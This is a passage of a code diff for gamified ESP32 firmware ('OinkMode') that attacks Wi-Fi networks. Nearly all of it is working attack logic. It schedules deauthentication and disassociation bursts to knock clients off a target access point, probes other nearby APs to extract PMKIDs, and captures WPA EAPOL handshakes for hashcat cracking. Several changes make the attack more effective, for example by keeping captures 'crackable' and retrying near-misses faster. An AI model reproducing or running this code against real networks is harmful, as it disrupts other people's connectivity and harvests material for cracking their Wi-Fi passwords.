+                                    deauthBurst.frameCount = 1;
+                                    deauthBurst.direction = 0;
+                                    deauthBurst.nextSendTime = now + DEAUTH_MAINTENANCE_MS;
+                                } else {
+                                    // Maintenance drip: cycle through clients
+                                    deauthBurst.clientIndex = 0;
+                                    deauthBurst.frameCount = 1;
+                                    deauthBurst.direction = 0;
+                                    deauthBurst.nextSendTime = now + DEAUTH_MAINTENANCE_MS;
+                                }
+                            } else {
+                                // More frames for this client
+                                uint32_t interval = (deauthBurst.phase == 0)
+                                    ? DEAUTH_KNOCK_INTERVAL_MS
+                                    : DEAUTH_MAINTENANCE_MS;
+                                deauthBurst.nextSendTime = now + interval;
+                            }
+                        }
+                        lastDeauthTime = now;
+                    }
+
+                    // Start new burst if none active and enough time has passed
+                    if (!deauthBurst.active && (now - lastDeauthTime > DEAUTH_BURST_INTERVAL_MS)) {
+                        deauthBurst.active = true;
+                        Avatar::waveRipple(WaveMode::OUTGOING);
+                        memcpy(deauthBurst.targetBssid, targetBssidLocal, 6);
+                        deauthBurst.phase = 0;  // Start with knock
+                        deauthBurst.direction = 0;
+                        deauthBurst.nextSendTime = now;
+
+                        if (clientCountLocal > 0) {
+                            deauthBurst.clientTotal = clientCountLocal;
+                            for (uint8_t c = 0; c < clientCountLocal; c++) {
+                                memcpy(deauthBurst.clientMacs[c], clientMacs[c], 6);
+                            }
+                            deauthBurst.clientIndex = 0;
+                            deauthBurst.frameCount = 2;  // Initial knock: 2 fast frames
+
+                            // Also send one disassoc per client (immediate, non-blocking)
+                            for (uint8_t c = 0; c < clientCountLocal; c++) {
+                                sendDisassocFrame(targetBssidLocal, clientMacs[c], 8);
+                            }
+                        } else {
+                            // No clients: broadcast deauth + disassoc
+                            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                            sendDeauthFrame(targetBssidLocal, broadcast, 7);
+                            sendDisassocFrame(targetBssidLocal, broadcast, 8);
+                            deauthCount++;
+                            deauthBurst.active = false;  // Single shot, no burst needed
+                        }
+
+                        // Mark session as having deauthed (for Silent Witness achievement)
+                        SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
+                        sess.everDeauthed = true;
+
+                        // #region agent log
                         static uint32_t lastDeauthLog = 0;
                         if (now - lastDeauthLog > 1000) {
                             lastDeauthLog = now;
-                            Serial.printf("[DBG-H6] DEAUTH clients=%d burst=%d total=%lu\n", clientCountLocal, burstCount, deauthCount);
+                            Serial.printf("[DEAUTH-NB] clients=%d total=%lu phase=%d\n",
+                                          clientCountLocal, deauthCount, deauthBurst.phase);
                         }
                         // #endregion
-                        for (uint8_t c = 0; c < clientCountLocal; c++) {
-                            // Send buff-modified deauths
-                            sendDeauthBurst(targetBssidLocal, clientMacs[c], burstCount);
-                            deauthCount += burstCount;
-                            
-                            // Also disassoc targeted client
-                            sendDisassocFrame(targetBssidLocal, clientMacs[c], 8);
-                        }
                     }
-                    
-                    // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
-                    // Only send when no clients discovered - reduces noise pollution
-                    if (clientCountLocal == 0) {
-                        sendDeauthFrame(targetBssidLocal, broadcast, 7);
-                        sendDisassocFrame(targetBssidLocal, broadcast, 8);  // Some devices respond to disassoc only
-                        deauthCount++;
-                    }
-                    
-                    lastDeauthTime = now;
                 }
-                
+
                 // Update mood with attack progress
                 if (now - lastMoodUpdate > 2000) {
                     if (targetSSIDLocal[0] != 0) {
@@ -1142,36 +1549,30 @@ void OinkMode::update() {
                     }
                     lastMoodUpdate = now;
                 }
-                
-                // Check if handshake captured - use BSSID lookup instead of targetIndex
-                // to avoid marking wrong network if cleanup shifted indices
+
+                // Change 9: O(1) handshake completion check via volatile flag
+                // Replaces O(H*N) vector scan with lock-free signaling
                 bool targetHandshakeCaptured = false;
                 char targetHandshakeSSID[33] = {0};
-                const bool wasBusyHandshake = oinkBusy;
-                oinkBusy = true;
-                NetworkRecon::enterCritical();
-                for (const auto& hs : handshakes) {
-                    if (!hs.isComplete()) continue;
-                    int netIdx = -1;
-                    for (int i = 0; i < (int)networks().size(); i++) {
-                        if (memcmp(networks()[i].bssid, hs.bssid, 6) == 0) {
-                            netIdx = i;
+                if (handshakeJustCompleted) {
+                    if (memcmp(justCompletedBssid, targetBssidLocal, 6) == 0) {
+                        targetHandshakeCaptured = true;
+                        strncpy(targetHandshakeSSID, targetSSIDLocal, 32);
+                        targetHandshakeSSID[32] = 0;
+                    }
+                    // Mark the network in networks vector (only take spinlock when flag is true)
+                    NetworkRecon::enterCritical();
+                    for (auto& net : networks()) {
+                        if (memcmp(net.bssid, justCompletedBssid, 6) == 0) {
+                            net.hasHandshake = true;
                             break;
                         }
                     }
-                    if (netIdx >= 0) {
-                        networks()[netIdx].hasHandshake = true;
-                        if (targetIndex >= 0 && targetIndex < (int)networks().size() &&
-                            memcmp(networks()[targetIndex].bssid, hs.bssid, 6) == 0) {
-                            targetHandshakeCaptured = true;
-                            strncpy(targetHandshakeSSID, networks()[netIdx].ssid, 32);
-                            targetHandshakeSSID[32] = 0;
-                        }
-                    }
+                    NetworkRecon::exitCritical();
+                    handshakeJustCompleted = false;
                 }
-                NetworkRecon::exitCritical();
-                oinkBusy = wasBusyHandshake;
                 if (targetHandshakeCaptured) {
+                    deauthBurst.active = false;  // Stop deauthing
                     if (targetHandshakeSSID[0] != 0) {
                         SDLog::log("OINK", "Handshake captured: %s", targetHandshakeSSID);
                     } else {
@@ -1184,18 +1585,34 @@ void OinkMode::update() {
                 
                 // Timeout - move to next target
                 if (autoState == AutoState::ATTACKING && now - attackStartTime > ATTACK_TIMEOUT) {
+                    deauthBurst.active = false;  // Stop any in-progress burst
+
+                    // Change 7: Reduced cooldown for M1-only captures (we were close, retry fast)
+                    bool hasM1OnlyForTarget = false;
+                    for (const auto& hs : handshakes) {
+                        if (memcmp(hs.bssid, targetBssid, 6) == 0 && hs.hasM1() && !hs.hasM2()) {
+                            hasM1OnlyForTarget = true;
+                            break;
+                        }
+                    }
+
                     NetworkRecon::enterCritical();
                     for (auto& net : networks()) {
                         if (memcmp(net.bssid, targetBssid, 6) == 0) {
-                            // Scale cooldown by RSSI: strong signals retry faster (likely timing issue),
-                            // weak signals wait longer (likely signal issue)
-                            int8_t tRssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
-                            uint32_t cooldown;
-                            if (tRssi >= -45) cooldown = 4000;
-                            else if (tRssi >= -55) cooldown = 6000;
-                            else if (tRssi >= -65) cooldown = 8000;
-                            else cooldown = 12000;
-                            net.cooldownUntil = now + cooldown;
+                            if (hasM1OnlyForTarget) {
+                                // M1-only: flat 2s cooldown - we were close, retry fast
+                                net.cooldownUntil = now + 2000;
+                            } else {
+                                // Scale cooldown by RSSI: strong signals retry faster (likely timing issue),
+                                // weak signals wait longer (likely signal issue)
+                                int8_t tRssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
+                                uint32_t cooldown;
+                                if (tRssi >= -45) cooldown = 4000;
+                                else if (tRssi >= -55) cooldown = 6000;
+                                else if (tRssi >= -65) cooldown = 8000;
+                                else cooldown = 12000;
+                                net.cooldownUntil = now + cooldown;
+                            }
                             break;
                         }
                     }
@@ -1211,36 +1628,70 @@ void OinkMode::update() {
             }
             
         case AutoState::WAITING:
+            // Change 5: Opportunistic PMKID probing during WAITING (channel locked to target)
+            // Probe other APs on same channel — free! Channel is already locked.
+            {
+                static uint32_t lastWaitPmkidProbe = 0;
+                if (now - lastWaitPmkidProbe > 1500 && now - stateStartTime > 500) {
+                    lastWaitPmkidProbe = now;
+                    uint8_t curCh = NetworkRecon::getCurrentChannel();
+                    NetworkRecon::enterCritical();
+                    for (size_t i = 0; i < networks().size() && i < 30; i++) {
+                        const auto& net = networks()[i];
+                        if (net.channel != curCh) continue;
+                        if (memcmp(net.bssid, targetBssid, 6) == 0) continue;  // Skip current target
+                        if (net.authmode == WIFI_AUTH_OPEN || net.authmode == WIFI_AUTH_WEP) continue;
+                        if (net.hasPMF || net.ssid[0] == 0 || net.isHidden) continue;
+                        if (isExcluded(net.bssid)) continue;
+                        bool hasPMKID = false;
+                        for (const auto& p : pmkids) {
+                            if (memcmp(p.bssid, net.bssid, 6) == 0) { hasPMKID = true; break; }
+                        }
+                        if (hasPMKID) continue;
+                        uint8_t probeBssid[6];
+                        char probeSSID[33];
+                        memcpy(probeBssid, net.bssid, 6);
+                        strncpy(probeSSID, net.ssid, 32);
+                        probeSSID[32] = 0;
+                        NetworkRecon::exitCritical();
+                        sendAuthenticationRequest(probeBssid);
+                        delay(10);
+                        sendAssociationRequest(probeBssid, probeSSID, strlen(probeSSID));
+                        goto wait_pmkid_done;
+                    }
+                    NetworkRecon::exitCritical();
+                    wait_pmkid_done:;
+                }
+            }
             // Brief pause between attacks - keep channel locked for late EAPOL frames
             if (now - stateStartTime > WAIT_TIME) {
                 // Check for incomplete handshake only once at WAIT_TIME threshold
-                // to avoid repeated vector iteration overhead
-                // (statics moved to file scope and reset in init())
-                
                 if (!checkedForPendingHandshake) {
                     checkedForPendingHandshake = true;
                     hasPendingHandshake = false;
                     if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
-                        const bool wasBusy = oinkBusy;
+                        const bool wasBusy2 = oinkBusy;
                         oinkBusy = true;
                         NetworkRecon::enterCritical();
                         for (const auto& hs : handshakes) {
-                            if (memcmp(hs.bssid, networks()[targetIndex].bssid, 6) == 0 && 
+                            if (memcmp(hs.bssid, networks()[targetIndex].bssid, 6) == 0 &&
                                 hs.hasM1() && !hs.hasM2()) {
                                 hasPendingHandshake = true;
                                 break;
                             }
                         }
                         NetworkRecon::exitCritical();
-                        oinkBusy = wasBusy;
+                        oinkBusy = wasBusy2;
                     }
                 }
-                
-                if (hasPendingHandshake && now - stateStartTime < WAIT_TIME * 2) {
-                    // Extended wait for pending handshake (up to 2x normal = 4 sec total)
+
+                // Change 3: M1-only captures get aggressive extended wait (3x = 13.5s)
+                // to give slow clients (IoT) time to complete handshake
+                uint32_t maxWait = hasPendingHandshake ? (WAIT_TIME * 3) : (WAIT_TIME * 2);
+                if (hasPendingHandshake && now - stateStartTime < maxWait) {
                     break;
                 }
-                
+
                 // Reset for next WAITING state
                 checkedForPendingHandshake = false;
                 hasPendingHandshake = false;
@@ -1251,48 +1702,88 @@ void OinkMode::update() {
         case AutoState::BORED:
             // Pig is bored - no valid targets available
             // Stop grass, show bored phrases, periodically retry
-            
+
             // Adaptive channel hop: fast sweep (500ms) when spectrum is empty
             // or all networks are below RSSI threshold (user is moving),
             // slow (2000ms) when strong networks present but none are valid targets
             uint32_t boredHopInterval;
-            if (networks().empty()) {
-                boredHopInterval = 500;
-            } else {
+            {
                 bool anyStrong = false;
                 NetworkRecon::enterCritical();
-                for (size_t i = 0; i < networks().size() && i < 20; i++) {
-                    int8_t r = (networks()[i].rssiAvg != 0) ? networks()[i].rssiAvg : networks()[i].rssi;
-                    if (r >= Config::wifi().attackMinRssi) { anyStrong = true; break; }
+                bool isEmpty = networks().empty();
+                if (!isEmpty) {
+                    for (size_t i = 0; i < networks().size() && i < 20; i++) {
+                        int8_t r = (networks()[i].rssiAvg != 0) ? networks()[i].rssiAvg : networks()[i].rssi;
+                        if (r >= Config::wifi().attackMinRssi) { anyStrong = true; break; }
+                    }
                 }
+                uint16_t netCount = networks().size();
                 NetworkRecon::exitCritical();
-                boredHopInterval = anyStrong ? 2000 : 500;
-            }
-            if (now - lastHopTime > boredHopInterval) {
-                hopChannel();
-                lastHopTime = now;
-            }
-            
-            // Update bored mood every 5 seconds
-            if (now - lastBoredUpdate > 5000) {
-                Mood::onBored(networks().size());
-                lastBoredUpdate = now;
-            }
-            
-            // Check if new networks appeared (promiscuous mode still active)
-            if (!networks().empty()) {
-                int nextIdx = getNextTarget();
-                if (nextIdx >= 0) {
-                    // New valid target appeared!
-                    consecutiveFailedScans = 0;
-                    autoState = AutoState::NEXT_TARGET;
-                    channelHopping = true;
-                    Mood::setStatusMessage("new bacon!");
-                    Avatar::sniff();
-                    break;
+                boredHopInterval = isEmpty ? 500 : (anyStrong ? 2000 : 500);
+
+                if (now - lastHopTime > boredHopInterval) {
+                    hopChannel();
+                    lastHopTime = now;
+                }
+
+                // Update bored mood every 5 seconds
+                if (now - lastBoredUpdate > 5000) {
+                    Mood::onBored(netCount);
+                    lastBoredUpdate = now;
+                }
+
+                // Change 5: Opportunistic PMKID probing during BORED state
+                // Already idle on each channel, probe eligible APs for free
+                {
+                    static uint32_t lastBoredPmkidProbe = 0;
+                    if (!isEmpty && now - lastBoredPmkidProbe > 2000) {
+                        lastBoredPmkidProbe = now;
+                        uint8_t curCh = NetworkRecon::getCurrentChannel();
+                        NetworkRecon::enterCritical();
+                        for (size_t i = 0; i < networks().size() && i < 30; i++) {
+                            const auto& net = networks()[i];
+                            if (net.channel != curCh) continue;
+                            if (net.authmode == WIFI_AUTH_OPEN || net.authmode == WIFI_AUTH_WEP) continue;
+                            if (net.hasPMF || net.ssid[0] == 0 || net.isHidden) continue;
+                            if (isExcluded(net.bssid)) continue;
+                            bool hasPMKID = false;
+                            for (const auto& p : pmkids) {
+                                if (memcmp(p.bssid, net.bssid, 6) == 0) { hasPMKID = true; break; }
+                            }
+                            if (hasPMKID) continue;
+                            // Found eligible AP on current channel — probe it
+                            uint8_t probeBssid[6];
+                            char probeSSID[33];
+                            memcpy(probeBssid, net.bssid, 6);
+                            strncpy(probeSSID, net.ssid, 32);
+                            probeSSID[32] = 0;
+                            NetworkRecon::exitCritical();
+                            sendAuthenticationRequest(probeBssid);
+                            delay(10);
+                            sendAssociationRequest(probeBssid, probeSSID, strlen(probeSSID));
+                            goto bored_pmkid_done;  // Probe one per cycle
+                        }
+                        NetworkRecon::exitCritical();
+                        bored_pmkid_done:;
+                    }
+                }
+
+                // Check if new networks appeared (promiscuous mode still active)
+                // getNextTarget() uses spinlock internally
+                if (!isEmpty) {
+                    int nextIdx = getNextTarget();
+                    if (nextIdx >= 0) {
+                        // New valid target appeared!
+                        consecutiveFailedScans = 0;
+                        autoState = AutoState::NEXT_TARGET;
+                        channelHopping = true;
+                        Mood::setStatusMessage("new bacon!");
+                        Avatar::sniff();
+                        break;
+                    }
                 }
             }
-            
+
             // Periodic retry - do a fresh scan every 30 seconds
             if (now - stateStartTime > BORED_RETRY_TIME) {
                 autoState = AutoState::SCANNING;
@@ -1344,30 +1835,28 @@ void OinkMode::update() {
         NetworkRecon::exitCritical();
     }
     
-    // Emergency heap recovery - also batched (max 3 per cycle)
-    // 3 erases from front = ~620µs, safely under 1ms WiFi budget
-    // PHASE 1 FIX: Preserve current target if possible
+    // Emergency heap recovery - erase lowest-priority networks from back (O(1) per pop)
+    // After sortNetworksByPriority, worst candidates are at the back.
     if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd && networks().size() > 50) {
         oinkBusy = true;
         NetworkRecon::enterCritical();
-        
+
         int emergencyErased = 0;
         while (networks().size() > 50 && emergencyErased < 3) {
-            // Preserve current target if possible
-            if (targetIndex >= 0 && networks().size() > 1) {
-                // Check if oldest is target - if so, swap with next oldest before erasing
-                if (memcmp(networks()[0].bssid, targetBssid, 6) == 0) {
-                    // Target is oldest - swap with second oldest to preserve it
-                    if (networks().size() > 1) {
-                        std::swap(networks()[0], networks()[1]);
-                    }
+            size_t lastIdx = networks().size() - 1;
+            // Preserve current target: if back element is target, swap with second-to-last
+            if (targetIndex >= 0 && memcmp(networks()[lastIdx].bssid, targetBssid, 6) == 0) {
+                if (lastIdx > 0) {
+                    std::swap(networks()[lastIdx], networks()[lastIdx - 1]);
+                } else {
+                    break;  // Target is the only element, don't erase
                 }
             }
-            networks().erase(networks().begin());
+            networks().pop_back();  // O(1) - no memmove
             emergencyErased++;
         }
-        
-        // Revalidate target by BSSID instead of blanket reset
+
+        // Revalidate target by BSSID (pop_back may have removed it despite swap attempt)
         if (emergencyErased > 0 && targetIndex >= 0) {
             int foundIdx = -1;
             for (int i = 0; i < (int)networks().size(); i++) {
@@ -1378,21 +1867,39 @@ void OinkMode::update() {
             }
             targetIndex = foundIdx;
             if (targetIndex < 0) {
-                // Target was erased - only now do we abort
                 deauthing = false;
                 channelHopping = true;
                 memset(targetBssid, 0, 6);
                 clearTargetClients();
             }
         }
-        
-        // Reset selection index regardless
+
         if (emergencyErased > 0) {
-            selectionIndex = 0;
+            if (selectionIndex >= (int)networks().size()) {
+                selectionIndex = networks().empty() ? 0 : (int)networks().size() - 1;
+            }
         }
-        
+
         NetworkRecon::exitCritical();
         oinkBusy = false;
+    }
+
+    // Run auto-save only when we're not in handshake/PMKID capture-critical states.
+    // If unsafe now, re-queue the request for a later update cycle.
+    if (shouldAutoSave) {
+        bool captureCritical =
+            (autoState == AutoState::PMKID_HUNTING) ||
+            (autoState == AutoState::LOCKING) ||
+            (autoState == AutoState::ATTACKING) ||
+            (autoState == AutoState::WAITING);
+
+        if (!captureCritical) {
+            autoSaveCheck();
+        } else {
+            NetworkRecon::enterCritical();
+            pendingAutoSave = true;
+            NetworkRecon::exitCritical();
+        }
     }
 
     updateTargetCache();
@@ -1409,22 +1916,35 @@ void OinkMode::stopScan() {
 }
 
 void OinkMode::selectTarget(int index) {
+    // Snapshot network data under spinlock to prevent stale reads
+    uint8_t snapBssid[6] = {0};
+    uint8_t snapChannel = 0;
+    bool valid = false;
+
+    NetworkRecon::enterCritical();
     if (index >= 0 && index < (int)networks().size()) {
-        clearTargetClients();
-        targetIndex = index;
-        memcpy(targetBssid, networks()[index].bssid, 6);  // Store BSSID
+        memcpy(snapBssid, networks()[index].bssid, 6);
+        snapChannel = networks()[index].channel;
         networks()[index].isTarget = true;
-        
+        valid = true;
+    }
+    NetworkRecon::exitCritical();
+
+    if (valid) {
+        clearTargetClients();
+        deauthPauseUntilMs.store(0, std::memory_order_relaxed);
+        targetIndex = index;
+        memcpy(targetBssid, snapBssid, 6);
+
         // Clear old beacon frame when target changes (static storage, no free)
         beaconFrame = beaconFrameStorage;
         beaconFrameLen = 0;
         beaconCaptured = false;
-        
-        // Lock to target's channel
+
+        // 2.4GHz target: lock to target's channel
+        // (5GHz targets are dispatched via C5 background, never reach selectTarget)
         channelHopping = false;
-        setChannel(networks()[index].channel);
-        
-        // Auto-start deauth when target selected
+        setChannel(snapChannel);
         deauthing = true;
     }
 
@@ -1432,12 +1952,15 @@ void OinkMode::selectTarget(int index) {
 }
 
 void OinkMode::clearTarget() {
+    NetworkRecon::enterCritical();
     if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
         networks()[targetIndex].isTarget = false;
     }
+    NetworkRecon::exitCritical();
     targetIndex = -1;
     memset(targetBssid, 0, 6);
     clearTargetClients();
+    deauthPauseUntilMs.store(0, std::memory_order_relaxed);
     deauthing = false;
     channelHopping = true;
     // Unlock channel so NetworkRecon resumes hopping
@@ -1516,47 +2039,35 @@ void OinkMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promi
     
     if (!pkt) return;
     if (!running) return;
-    if (oinkBusy) return;
-    
+
     uint16_t len = pkt->rx_ctrl.sig_len;
     int8_t rssi = pkt->rx_ctrl.rssi;
-    
+
     // ESP32 adds 4 ghost bytes to sig_len
     if (len > 4) len -= 4;
     if (len < 24) return;
 
     packetCount.fetch_add(1, std::memory_order_relaxed);
-    
-    // #region agent log - H5 callback firing
-    {
-        static uint32_t lastCbLog = 0;
-        static uint32_t cbCount = 0;
-        cbCount++;
-        uint32_t now = millis();
-        if (now - lastCbLog > 3000) {
-            lastCbLog = now;
-            Serial.printf("[DBG-H5] OINK callback count=%lu type=%d\n", cbCount, (int)type);
-        }
-    }
-    // #endregion
-    
+
     const uint8_t* payload = pkt->payload;
     uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
-    
+
     switch (type) {
         case WIFI_PKT_MGMT:
-            if (frameSubtype == 0x08) {  // Beacon
-                // Only capture beacon for target AP (PCAP needs it)
+            // Gate beacon processing behind oinkBusy — beacons are non-critical
+            if (oinkBusy) break;
+            if (frameSubtype == 0x08) {
                 processBeacon(payload, len, rssi);
             }
-            // Note: Probe responses handled by NetworkRecon for SSID reveal
             break;
-            
+
         case WIFI_PKT_DATA:
-            // EAPOL/handshake capture (OINK's main job)
+            // EAPOL is time-critical (<30ms handshake window) — NEVER gate behind oinkBusy.
+            // Thread safety is handled by spinlock in processDataFrame/processEAPOL
+            // and CAS atomics in the pending handshake pool.
             processDataFrame(payload, len, rssi);
             break;
-            
+
         default:
             break;
     }
@@ -1585,13 +2096,19 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
         }
     }
     
-    // Update hasHandshake flag in shared network data
-    int idx = findNetwork(bssid);
-    if (idx >= 0) {
+    // Update hasHandshake flag for target AP only (not every beacon).
+    // The flag is already set when handshakes are captured in processEAPOL/ATTACKING/C5 paths.
+    // This is a consistency check restricted to target BSSID to avoid spinlock thrashing
+    // on every beacon from every AP in the callback hot path.
+    if (targetBssid[0] != 0 && memcmp(bssid, targetBssid, 6) == 0) {
+        bool hasHs = hasHandshakeFor(bssid);
         NetworkRecon::enterCritical();
         auto& nets = NetworkRecon::getNetworks();
-        if (idx < (int)nets.size()) {
-            nets[idx].hasHandshake = hasHandshakeFor(bssid);
+        for (int i = 0; i < (int)nets.size(); i++) {
+            if (memcmp(nets[i].bssid, bssid, 6) == 0) {
+                nets[i].hasHandshake = hasHs;
+                break;
+            }
         }
         NetworkRecon::exitCritical();
     }
@@ -1751,7 +2268,7 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
     else if (!keyAck && keyMic && secure) messageNum = 4;
     
     if (messageNum == 0) return;
-    
+
     // Determine which is AP (sender of M1/M3) and station
     uint8_t bssid[6], station[6];
     if (messageNum == 1 || messageNum == 3) {
@@ -1761,6 +2278,17 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
         memcpy(bssid, dstMac, 6);
         memcpy(station, srcMac, 6);
     }
+
+    const bool stationIsOurs = ourStaMacValid && (memcmp(station, ourStaMac, 6) == 0);
+    const bool stationIsUnicast = OinkCaptureFilters::isUnicastMac(station);
+
+    // Deferred diagnostic: flag for main loop to print (no Serial in callback context)
+    if (!pendingEapolMsg) {
+        memcpy(pendingEapolBssid, bssid, 6);
+        memcpy(pendingEapolStation, station, 6);
+        pendingEapolFlags = stationIsOurs ? 0x01 : 0x00;
+        pendingEapolMsg = messageNum;  // volatile write last — acts as release
+    }
     
     // M1 = AP initiating handshake = client reconnected after deauth!
     // If we're deauthing this target, our deauth worked!
@@ -1768,10 +2296,17 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
     // targetIndex can become stale after cleanupStaleNetworks shifts indices on core 0)
     if (messageNum == 1 && deauthing && targetBssid[0] != 0) {
         if (memcmp(bssid, targetBssid, 6) == 0) {
-            // DEFERRED: Queue deauth success for main thread
-            if (!pendingDeauthSuccess) {
-                memcpy(pendingDeauthStation, station, 6);
-                pendingDeauthSuccess = true;
+            // PMKID probing can cause AP->STA M1 retransmits to our own station MAC.
+            // Do not treat those as "deauth success" (and don't pause jamming) or we will miss real client handshakes.
+            if (OinkCaptureFilters::shouldMarkDeauthSuccessOnM1(stationIsOurs, stationIsUnicast)) {
+                // Stop blasting for a short window and listen for M2/M3/M4.
+                // Continuous deauth here can interrupt the handshake we just induced.
+                deauthPauseUntilMs.store(millis() + DEAUTH_POST_M1_LISTEN_MS, std::memory_order_relaxed);
+                // DEFERRED: Queue deauth success for main thread
+                if (!pendingDeauthSuccess) {
+                    memcpy(pendingDeauthStation, station, 6);
+                    pendingDeauthSuccess = true;
+                }
             }
         }
     }
@@ -1791,7 +2326,7 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
             
             // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
             // Can appear at start or within Key Data
-            for (uint16_t i = 0; i + 22 < keyDataLen; i++) {  // Strict < ensures 22 bytes remain
+            for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {  // Need exactly 22 bytes for KDE
                 if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                     keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                     keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
@@ -1879,6 +2414,12 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
             }
         }
     }
+
+    // Treat EAPOL where station == our STA MAC as probe traffic: keep PMKID extraction above,
+    // but do not create/store handshake records (avoids burning handshake slots and deauth-success false positives).
+    if (!OinkCaptureFilters::shouldStoreHandshakeForStation(stationIsOurs)) {
+        return;
+    }
     
     // Find or create handshake entry (lookup only - no push_back)
     int hsIdx = findOrCreateHandshake(bssid, station);
@@ -1894,23 +2435,28 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
         }
         
         CapturedHandshake& hs = handshakes[hsIdx];
-        
+
         // Store this frame (EAPOL payload for hashcat 22000)
+        // Guard: don't overwrite an already-captured frame — retransmissions
+        // may carry a different ANonce/SNonce, producing nonce mismatch that
+        // makes the .22000/.pcap uncrackable.
         uint8_t frameIdx = messageNum - 1;
-        uint16_t copyLen = min((uint16_t)512, len);
-        memcpy(hs.frames[frameIdx].data, payload, copyLen);
-        hs.frames[frameIdx].len = copyLen;
-        hs.frames[frameIdx].messageNum = messageNum;
-        hs.frames[frameIdx].timestamp = millis();
-        hs.frames[frameIdx].rssi = rssi;
-        
-        // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
-        uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
-        memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
-        hs.frames[frameIdx].fullFrameLen = fullCopyLen;
-        
-        // Update mask
-        hs.capturedMask |= (1 << frameIdx);
+        if (hs.frames[frameIdx].len == 0) {
+            uint16_t copyLen = min((uint16_t)512, len);
+            memcpy(hs.frames[frameIdx].data, payload, copyLen);
+            hs.frames[frameIdx].len = copyLen;
+            hs.frames[frameIdx].messageNum = messageNum;
+            hs.frames[frameIdx].timestamp = millis();
+            hs.frames[frameIdx].rssi = rssi;
+
+            // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
+            uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
+            memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
+            hs.frames[frameIdx].fullFrameLen = fullCopyLen;
+
+            // Update mask
+            hs.capturedMask |= (1 << frameIdx);
+        }
         hs.lastSeen = millis();
         
         // Look up SSID from networks if not set (already holding NetworkRecon critical section)
@@ -1942,6 +2488,10 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
                 pendingHandshakeComplete = true;
             }
             pendingAutoSave = true;
+
+            // Change 9: Set O(1) completion flag for ATTACKING state check
+            memcpy(justCompletedBssid, bssid, 6);
+            handshakeJustCompleted = true;  // volatile write last — acts as release
         }
     } else {
         // New handshake - enqueue to circular buffer for main thread
@@ -1950,6 +2500,8 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
         // Find or update existing slot for this handshake in the buffer
         uint8_t targetSlot = PENDING_HS_SLOTS;  // Invalid slot marker
         uint8_t writePos = pendingHsWrite;
+        uint8_t frameIdx = messageNum - 1;
+        bool frameWrittenInAlloc = false;
         
         // Check if we already have a slot for this handshake (scan from read to write)
         uint8_t scanPos = pendingHsRead;
@@ -1975,13 +2527,31 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
                 pendingHsAllocated[targetSlot] = true;
                 pendingHandshakes[targetSlot] = &pendingHsPool[targetSlot];
                 
-                pendingHsBusy[targetSlot] = true;  // Lock slot during init
+                pendingHsBusy[targetSlot] = true;  // Lock slot during init and first frame write
                 
                 memcpy(pendingHandshakes[targetSlot]->bssid, bssid, 6);
                 memcpy(pendingHandshakes[targetSlot]->station, station, 6);
                 pendingHandshakes[targetSlot]->messageNum = 0;  // Deprecated field
                 pendingHandshakes[targetSlot]->capturedMask = 0;
                 pendingHandshakes[targetSlot]->hasPMKID = false;
+
+                // Write the first frame before publishing write pointer.
+                // This prevents consumer from seeing/consuming an empty slot.
+                if (frameIdx < 4) {
+                    // EAPOL payload for hashcat 22000
+                    uint16_t copyLen = min((uint16_t)512, len);
+                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
+                    pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;
+
+                    // Full 802.11 frame for PCAP export
+                    uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
+                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
+                    pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
+                    pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;
+
+                    pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
+                    frameWrittenInAlloc = true;
+                }
                 
                 // Advance write pointer
                 pendingHsWrite = nextWrite;
@@ -1991,26 +2561,28 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
             // else: buffer full, drop this frame (extremely rare with 4 slots)
         }
         
-        // Store frame in target slot if we have one
-        if (targetSlot < PENDING_HS_SLOTS && pendingHandshakes[targetSlot] && !pendingHsBusy[targetSlot]) {
-            uint8_t frameIdx = messageNum - 1;
-            if (frameIdx < 4) {
-                pendingHsBusy[targetSlot] = true;  // Lock slot during update
-                
-                // EAPOL payload for hashcat 22000
-                uint16_t copyLen = min((uint16_t)512, len);
-                memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
-                pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;
-                
-                // Full 802.11 frame for PCAP export
